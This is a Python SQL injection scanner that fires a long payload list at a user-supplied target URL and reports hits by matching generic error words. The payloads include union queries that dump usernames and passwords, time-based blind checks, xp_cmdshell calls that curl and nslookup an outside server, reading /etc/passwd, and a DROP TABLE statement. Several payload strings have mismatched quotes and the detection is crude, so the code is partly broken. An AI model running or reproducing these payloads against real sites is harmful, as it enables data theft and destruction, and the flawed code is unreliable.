import requests
import logging
import threading
import time
from urllib.parse import urljoin
from bs4 import BeautifulSoup
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Set up logging
logger = logging.getLogger()
logger.setLevel(logging.INFO)

# Define a custom logging handler to use colorama
class ColorLogger(logging.Handler):
    def emit(self, record):
        log_message = self.format(record)
        if record.levelname == "INFO":
            print(Fore.GREEN + log_message)
        elif record.levelname == "WARNING":
            print(Fore.YELLOW + log_message)
        elif record.levelname == "ERROR":
            print(Fore.RED + log_message)
        else:
            print(log_message)

# Add our custom color handler to the logger
color_handler = ColorLogger()
formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
color_handler.setFormatter(formatter)
logger.addHandler(color_handler)

# SQL Injection Payloads (Upgraded)
SQL_PAYLOADS = [
    # Classic (Error-Based) SQLi Payloads
    "' OR 1=1 --", 
    '" OR "a"="a"',
    "' OR 'a'='a' --",
    '" OR 1=1#',
    "' OR 1=1 --",
    "'; SELECT 1 --",  
    '" OR 1=1 #',  
    "' OR 1=1 /*",  

    # Union-Based SQLi Payloads
    "' UNION SELECT null, null --",  
    "' UNION SELECT null, username, password FROM users --",  
    '" UNION SELECT null, username, password FROM users --',  
    "' UNION SELECT null, group_concat(table_name), null FROM information_schema.tables --",  
    '" UNION SELECT null, group_concat(column_name), null FROM information_schema.columns WHERE table_name = \'users\' --"',  
    "' UNION SELECT null, group_concat(username, \':\', password), null FROM users --",  
    "' UNION SELECT null, database(), null --",  
    '" UNION SELECT null, version(), null --",  

    # Blind SQLi Payloads
    "' AND 1=1 --",  
    "' AND 1=2 --",  
    "' AND (SELECT 1 FROM dual) --",  
    '" AND 1=1 --",  
    '" AND 1=2 --",  
    "' AND sleep(5) --",  
    '" AND sleep(5) --",  
    "' AND IF(1=1, SLEEP(5), 0) --",  
    '" AND IF(1=1, SLEEP(5), 0) --",  
    "' AND 1=1 HAVING 1=1 --",  

    # Time-Based Blind SQLi Payloads
    "' AND SLEEP(5) --",  
    '" AND SLEEP(5) --",  
    "' OR IF(1=1, SLEEP(5), 0) --",  
    '" OR IF(1=1, SLEEP(5), 0) --",  
    "' AND 1=1 WAITFOR DELAY \'00:00:05\' --",  
    '" AND 1=1 WAITFOR DELAY \'00:00:05\' --",  
    "'; SELECT pg_sleep(5) --",  

    # Out-of-Band (OOB) SQLi Payloads
    "'; EXEC xp_cmdshell(\'nslookup your_custom_dns_server.com\') --",  
    '" OR 1=1 UNION SELECT null, load_file(\'/etc/passwd\') --",  
    "'; EXEC xp_cmdshell(\'curl http://your_custom_server.com/data\') --",  
    '" OR 1=1 UNION SELECT null, sys.eval(\'cmd\') --"',  

    # Second-Order SQLi Payloads
    "admin' --",  
    "1' OR '1'='1 --",  
    "admin' AND password = 'anything' --",  
    "test' OR 1=1 --",  
    "' OR 1=1; DROP TABLE users; --",  
]

class SQLScan:
    def __init__(self, url):
        self.url = url
        self.session = requests.Session()
        self.timeout = 5
        self.max_retries = 3
    
    def send_request(self, url, params=None):
        """ Send a GET or POST request and return the response. """
        try:
            response = self.session.get(url, params=params, timeout=self.timeout)
            response.raise_for_status()
            return response
        except requests.RequestException as e:
            logger.error(f"Error with request: {e}")
            return None
    
    def test_sql_injection(self, url, payload):
        """ Test a single SQL injection payload on the URL. """
        logger.info(f"Testing payload: {payload}")
        params = {'id': payload}  # Example parameter; this needs to be adjusted based on the target.
        
        response = self.send_request(url, params)
        
        if response:
            if self.detect_sql_error(response.text):
                logger.warning(f"Potential SQLi vulnerability found at: {url} with payload: {payload}")
                return True
        return False

    def detect_sql_error(self, response_text):
        """ Simple check for SQL error message patterns in response text. """
        sql_errors = ['syntax error', 'mysql', 'sql', 'Warning', 'error', 'exception']
        for error in sql_errors:
            if error.lower() in response_text.lower():
                return True
        return False

    def brute_force_sql_injection(self):
        """ Try all payloads on the target URL. """
        for payload in SQL_PAYLOADS:
            full_url = urljoin(self.url, self.url)
            if self.test_sql_injection(full_url, payload):
                return True
        return False

def scan_target(url):
    """ Main function to handle scanning in a multi-threaded way. """
    scanner = SQLScan(url)
    if scanner.brute_force_sql_injection():
        logger.info(f"SQL Injection found on {url}")
    else:
        logger.info(f"No vulnerabilities found on {url}")

# Use threading to scan multiple URLs in parallel (for demonstration)
def threaded_scan(urls):
    """ Start scanning multiple URLs concurrently. """
    threads = []
    for url in urls:
        thread = threading.Thread(target=scan_target, args=(url,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    target_url = input("Enter the target URL: ")
    urls = [target_url]  # You can add more URLs to this list for batch scanning.
    
    # Start multi-threaded scan
    start_time = time.time()
    threaded_scan(urls)
    end_time = time.time()
    
    logger.info(f"Scanning completed in {end_time - start_time:.2f} seconds.")
